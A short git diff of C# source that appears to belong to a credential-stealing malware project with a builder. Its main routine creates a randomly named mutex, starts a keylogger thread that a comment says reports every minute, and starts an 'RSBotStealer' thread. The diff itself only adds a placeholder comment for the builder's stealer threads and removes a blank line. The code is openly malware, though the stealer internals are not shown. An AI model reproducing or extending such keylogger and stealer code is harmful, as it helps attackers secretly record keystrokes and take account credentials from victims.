@@ -31,9 +31,10 @@ namespace sub
                            };
             Variables.Mutex = new Mutex(false, GetKey(Random.Next(15, 26)), out Variables.CreatedMutex);
 
+            //put {StealerThreads} here instead of the thread initilizers for builder
+
             StealerThread logger = new StealerThread(new Keylogger(), -1);
             logger.Start(); //Starts a Keylogger that reports every 1 minute
-
 
             StealerThread rsbot = new StealerThread(new RSBotStealer(), -1);
             rsbot.Start();
